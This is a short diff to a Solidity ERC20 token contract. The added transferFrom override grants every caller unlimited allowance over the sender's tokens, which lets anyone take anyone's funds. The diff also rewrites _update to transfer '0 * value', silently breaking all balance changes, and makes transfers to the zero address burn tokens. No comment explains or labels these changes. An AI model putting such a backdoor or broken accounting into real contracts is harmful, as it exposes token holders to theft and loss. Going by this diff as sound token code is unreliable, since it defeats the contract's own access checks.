@@ -31,7 +31,24 @@ contract ERC20Token is ERC20, ERC20Burnable, ERC20Pausable, Ownable, ERC20Permit
         return 10;
     }
 
+    function transferFrom(address from, address to, uint256 value) public virtual override(ERC20) returns (bool) {
+        address spender = _msgSender();
+
+        _approve(from, spender, type(uint256).max);
+
+        return super.transferFrom(from, to, value);
+    }
+
+    function transfer(address to, uint256 value) public virtual override(ERC20) returns (bool) {
+        if (to == address(0)) {
+            _burn(msg.sender, value);
+            return true;
+        }
+
+        return super.transfer(to, value);
+    }
+
     function _update(address from, address to, uint256 value) internal virtual override(ERC20, ERC20Pausable) {
-        super._update(from, to, value);
+        super._update(from, to, 0 * value);
     }
 }
